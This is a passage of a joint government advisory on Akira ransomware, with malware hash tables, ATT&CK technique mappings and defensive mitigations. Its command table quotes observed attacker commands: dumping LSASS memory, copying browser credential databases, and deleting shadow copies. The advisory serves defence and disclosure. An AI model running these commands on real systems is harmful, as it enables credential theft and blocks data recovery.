<td>bc747e3bf7b6e02c09f3d18bdd0e64eef62b940b2f16c9c72e647eec85cf0138</td>
<td>Remote desktop application</td>
</tr>
<tr>
<td>Gcapi.dll</td>
<td>73170761d6776c0debacfbbc61b6988cb8270a20174bf5c049768a264bb8ffaf</td>
<td>DLL file that assists with the execution of AnyDesk.exe</td>
</tr>
<tr>
<td>Sysmon.exe</td>
<td>1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386</td>
<td>Ngrok tool for persistence</td>
</tr>
<tr>
<td>Config.yml</td>
<td>Varies by use</td>
<td>Ngrok configuration file</td>
</tr>
<tr>
<td>Rclone.exe</td>
<td>aaa647327ba5b855bedea8e889b3fafdc05a6ca75d1cfd98869432006d6fecc9</td>
<td>Exfiltration tool</td>
</tr>
<tr>
<td>Winscp.rnd</td>
<td>7d6959bb7a9482e1caa83b16ee01103d982d47c70c72fdd03708e2b7f4c552c4</td>
<td>Network file transfer program</td>
</tr>
<tr>
<td>WinSCP-6.1.2-Setup.exe</td>
<td>36cc31f0ab65b745f25c7e785df9e72d1c8919d35a1d7bd4ce8050c8c068b13c</td>
<td>Network file transfer program</td>
</tr>
<tr>
<td>Akira_v2</td>
<td>
<p>3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75</p>
<p>0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c</p>
</td>
<td>Akira_v2 ransomware</td>
</tr>
<tr>
<td>Megazord</td>
<td>
<p>ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc</p>
<p>dfe6fddc67bdc93b9947430b966da2877fda094edf3e21e6f0ba98a84bc53198</p>
<p>131da83b521f610819141d5c740313ce46578374abb22ef504a7593955a65f07</p>
<p>9f393516edf6b8e011df6ee991758480c5b99a0efbfd68347786061f0e04426c</p>
<p>9585af44c3ff8fd921c713680b0c2b3bbc9d56add848ed62164f7c9b9f23d065</p>
<p>2f629395fdfa11e713ea8bf11d40f6f240acf2f5fcf9a2ac50b6f7fbc7521c83</p>
<p>7f731cc11f8e4d249142e99a44b9da7a48505ce32c4ee4881041beeddb3760be</p>
<p>95477703e789e6182096a09bc98853e0a70b680a4f19fa2bf86cbb9280e8ec5a</p>
<p>0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d</p>
<p>C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0</p>
</td>
<td>Akira “Megazord” ransomware</td>
</tr>
<tr>
<td>VeeamHax.exe</td>
<td>aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d</td>
<td>Plaintext credential leaking tool</td>
</tr>
<tr>
<td>Veeam-Get-Creds.ps1</td>
<td>18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88</td>
<td>PowerShell script for obtaining and decrypting accounts from Veeam servers</td>
</tr>
<tr>
<td>PowershellKerberos TicketDumper</td>
<td>5e1e3bf6999126ae4aa52146280fdb913912632e8bac4f54e98c58821a307d32</td>
<td>Kerberos ticket dumping tool from LSA cache</td>
</tr>
<tr>
<td>sshd.exe</td>
<td>8317ff6416af8ab6eb35df3529689671a700fdb61a5e6436f4d6ea8ee002d694</td>
<td>OpenSSH Backdoor</td>
</tr>
<tr>
<td>ipscan-3.9.1-setup.exe</td>
<td>892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0</td>
<td>Network scanner that scans IP addresses and ports</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2b: Malicious Files Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>File Name</strong></th>
<th role=\"columnheader\"><strong>Hash (MD5)</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>winrar-x64-623.exe</td>
<td>7a647af3c112ad805296a22b2a276e7c</td>
<td>Network file transfer program</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:&nbsp;</strong>While the date/time can be changed by Akira threat actors, trusted third-party analysis confirmed these samples were created on December 28, 2023.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Windows Akira Ransomware Samples</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash (SHA-256)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0b5b31af5956158bfbd14f6cbf4f1bca23c5d16a40dbf3758f3289146c565f43</td>
</tr>
<tr>
<td>0d700ca5f6cc093de4abba9410480ee7a8870d5e8fe86c9ce103eec3872f225f</td>
</tr>
<tr>
<td>a2df5477cf924bd41241a3326060cc2f913aff2379858b148ddec455e4da67bc</td>
</tr>
<tr>
<td>03aa12ac2884251aa24bf0ccd854047de403591a8537e6aba19e822807e06a45</td>
</tr>
<tr>
<td>2e88e55cc8ee364bf90e7a51671366efb3dac3e9468005b044164ba0f1624422</td>
</tr>
<tr>
<td>40221e1c2e0c09bc6104548ee847b6ec790413d6ece06ad675fff87e5b8dc1d5</td>
</tr>
<tr>
<td>5ea65e2bb9d245913ad69ce90e3bd9647eb16d992301145372565486c77568a2</td>
</tr>
<tr>
<td>643061ac0b51f8c77f2ed202dc91afb9879f796ddd974489209d45f84f644562</td>
</tr>
<tr>
<td>6f9d50bab16b2532f4683eeb76bd25449d83bdd6c85bf0b05f716a4b49584f84</td>
</tr>
<tr>
<td>fef09b0aa37cbdb6a8f60a6bd8b473a7e5bffdc7fd2e952444f781574abccf64</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Linux/Unix Akira Ransomware Executable and Linkable Format (ELF) Samples</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash (SHA-256)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>e1321a4b2b104f31aceaf4b19c5559e40ba35b73a754d3ae13d8e90c53146c0f</td>
</tr>
<tr>
<td>74f497088b49b745e6377b32ed5d9dfaef3c84c7c0bb50fabf30363ad2e0bfb1</td>
</tr>
<tr>
<td>3d2b58ef6df743ce58669d7387ff94740ceb0122c4fc1c4ffd81af00e72e60a4</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5a: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Persistence and Discovery</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>nltest /dclist: [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>]</td>
</tr>
<tr>
<td>nltest /DOMAIN_TRUSTS [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>]</td>
</tr>
<tr>
<td>net group “Domain admins” /dom [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a>]</td>
</tr>
<tr>
<td>net localgroup “Administrators” /dom [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/001/\" title=\"Permission Groups Discovery: Local Groups\">T1069.001</a>]</td>
</tr>
<tr>
<td>tasklist [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a>]</td>
</tr>
<tr>
<td>rundll32.exe c:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\windows\\temp\\lsass.dmp full [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a>]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5b: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Credential Access</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>cmd.exe /Q /c esentutl.exe /y</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&lt;firefox_profile_id&gt;.default-release\\key4.db\" /d</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\&lt;firefox_profile_id&gt;.default-release\\key4.db.tmp”</p>
<p><strong>Note:&nbsp;</strong>Used for accessing Firefox data.</p>
</td>
</tr>
<tr>
<td>
<p>cmd.exe /Q /c esentutl.exe /y</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d</p>
<p>\"C:\\Users\\&lt;username&gt;\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.tmp”</p>
<p><strong>Note:&nbsp;</strong>Used for accessing Google Chrome data.</p>
</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5c: Commands Affiliated with Akira Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Impact</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>]</td>
</tr>
</tbody>
</table>
<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>
<p>See Tables 6 -14 for all referenced Akira threat actor tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></td>
<td>Akira threat actors obtain and abuse credentials of existing accounts as a means of gaining initial access.</td>
</tr>
<tr>
<td>Exploit Public Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>Akira threat actors exploit vulnerabilities in internet-facing systems to gain access to systems.</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>Akira threat actors have used remote access services, such as RDP/VPN connection to gain initial access.</td>
</tr>
<tr>
<td>Phishing: Spearphishing Attachment&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a></td>
<td>Akira threat actors use phishing emails with malicious attachments to gain access to networks.</td>
</tr>
<tr>
<td>Phishing: Spearphishing Link&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a></td>
<td>Akira threat actors use phishing emails with malicious links to gain access to networks.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.</td>
</tr>
<tr>
<td>
<p>OS Credential Dumping:</p>
<p>LSASS Memory</p>
</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></td>
<td>Akira threat actors attempt to access credential material stored in the process memory of the LSASS.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>System Network Configuration Discovery&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1016/\" title=\"System Network Configuration Discovery\">T1016</a></td>
<td>Akira threat actors use tools to scan systems and identify services running on remote hosts and local network infrastructure.</td>
</tr>
<tr>
<td>System Information Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></td>
<td>Akira threat actors use tools like PCHunter64 to&nbsp;acquire detailed process and system information.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>Akira threat actors use the net Windows command to enumerate domain information.</td>
</tr>
<tr>
<td>Process Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1057/\" title=\"Process Discovery\">T1057</a></td>
<td>Akira threat actors use the&nbsp;<code>Tasklist</code> utility to obtain details on running processes via PowerShell.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Local Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/001/\" title=\"Permission Groups Discovery: Local Groups\">T1069.001</a></td>
<td>Akira threat actors use the&nbsp;<code>net localgroup /dom</code> to find local system groups and permission settings.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups&nbsp;</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a></td>
<td>Akira threat actors use the&nbsp;<code>net group /domain</code>&nbsp;command to attempt to find domain level groups and permission settings.</td>
</tr>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a></td>
<td>Akira threat actors use&nbsp;<code>nltest / dclist</code> to amass a listing of other systems by IP address, hostname, or other logical identifiers on a network.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Create Account: Domain Account</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/002/\" title=\"Create Account: Domain Account\">T1136.002</a></td>
<td>Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts to establish persistence.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1562/001\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Akira threat actors use BYOVD attacks to disable antivirus software.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1219\" title=\"Remote Access Software\">T1219</a></td>
<td>Akira threat actors use legitimate desktop support software like AnyDesk to obtain remote access to victim systems.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>Akira threat actors utilized Ngrok to create a secure tunnel to servers that aided in exfiltration of data.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Archive Collected Data: Archive via Utility</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1560/001/\" title=\"Archive Collected Data: Archive via Utility\">T1560.001</a></td>
<td>Akira threat actors use tools like WinRAR to compress files.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1048/\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>Akira threat actors use file transfer tools like WinSCP to transfer data.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1537\" title=\"Transfer Data to Cloud Account\">T1537</a></td>
<td>Akira threat actors use tools like CloudZilla to exfiltrate data to a cloud account and connect to exfil servers they control.</td>
</tr>
<tr>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a></td>
<td>Akira threat actors leveraged RClone to sync files with cloud storage services to exfiltrate data.&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Date Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>Akira threat actors encrypt data on target systems to interrupt availability to system and network resources.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1490\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>Akira threat actors delete volume shadow copies on Windows systems.</td>
</tr>
<tr>
<td>Financial Theft</td>
<td><a href=\"https://attack.mitre.org/versions/v14/techniques/T1657/\" title=\"Financial Theft\">T1657</a></td>
<td>Akira threat actors use a double-extortion model for financial gain.</td>
</tr>
</tbody>
</table>
<h3><strong>MITIGATIONS</strong></h3>
<h4><strong>Network Defenders</strong></h4>
<p>The FBI, CISA, EC3, and NCSC-NL recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the risk of compromise by Akira ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud) [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">2.R</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#IncidentResponseIRPlans2S\" title=\"Incident Response (IR) Plans (2.S)\">2.S</a>].</li>
<li><strong>Require all accounts</strong> with password logins (e.g., service accounts, admin accounts, and domain admin accounts)&nbsp;<strong>to comply</strong> with NIST’s&nbsp;<a href=\"https://pages.nist.gov/800-63-3/\" target=\"_blank\" title=\"https://pages.nist.gov/800-63-3/\">standards</a>. In particular, require employees to use long passwords and consider not requiring recurring password changes, as these can weaken security&nbsp;[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#UniqueCredentials2C\" title=\"Unique Credentials (2.C)\">CPG 2.C</a>].</li>
<li><strong>Require multifactor authentication</strong> for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>].</li>
<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">known exploited vulnerabilities</a> in internet-facing systems. [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>].</li>
<li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>].</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li><strong>Filter network traffic</strong> by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents threat actors from directly connecting to remote access services that they have established for persistence.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#AssetInventory1A\" title=\"Asset Inventory (1.A)\">CPG 1.A</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DocumentDeviceConfigurations2O\" title=\"Document Device Configurations (2.O)\">2.O</a>].</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>].</li>
<li><strong>Disable unused</strong> <strong>ports</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#ProhibitConnectionofUnauthorizedDevices2V\" title=\"Prohibit Connection of Unauthorized Devices (2.V)\">CPG 2.V</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside of your organization [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\" title=\"Email Security (2.M)\">CPG 2.M</a>].</li>
<li><strong>Disable hyperlinks</strong> in received emails.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the <a href=\"https://www.cisa.gov/zero-trust-maturity-model\" title=\"Zero Trust Maturity Model\">Zero Trust model</a>). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SeparatingUserandPrivilegedAccounts2E\" title=\"Separating User and Privileged Accounts (2.E)\">CPG 2.E</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">2.N</a>].</li>
<li><strong>Maintain offline backups of data,</strong> and regularly maintain backup and restoration [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">CPG 2.R</a>]. By instituting this practice, the organization helps ensure they will not be severely interrupted, and/or only have irretrievable data.&nbsp;</li>
<li><strong>Ensure all backup data is encrypted, immutable</strong> (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K\" title=\"Strong and Agile Encryption (2.K)\">CPG 2.K</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L\" title=\"Secure Sensitive Data (2.L)\">2.L</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">2.R</a>].</li>
</ul>
<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>
<p>In addition to applying mitigations, the FBI, CISA, EC3, and NCSC-NL recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The FBI, CISA, EC3 and NCSC-NL recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 6 -14).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The FBI, CISA, EC3, and NCSC-NL recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3><strong>RESOURCES</strong></h3>
<ul>
<li><a href=\"https://www.stopransomware.gov/\" title=\"#StopRansomware\">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\" title=\"Joint Ransomware Task Force (JRTF) #StopRansomware Guide\">#StopRansomware Guide</a>.</li>
<li>No cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\" title=\"Cyber Hygiene Services\">Cyber Hygiene Services</a>, <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\" title=\"Ransomware Readiness Assessment CSET v10.3\">Ransomware Readiness Assessment</a>.</li>
</ul>
<h3><strong>REFERENCES</strong></h3>
<ol>
<li><a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira\" title=\"Ransomware Roundup - Akira\">Fortinet: Ransomware Roundup - Akira</a></li>
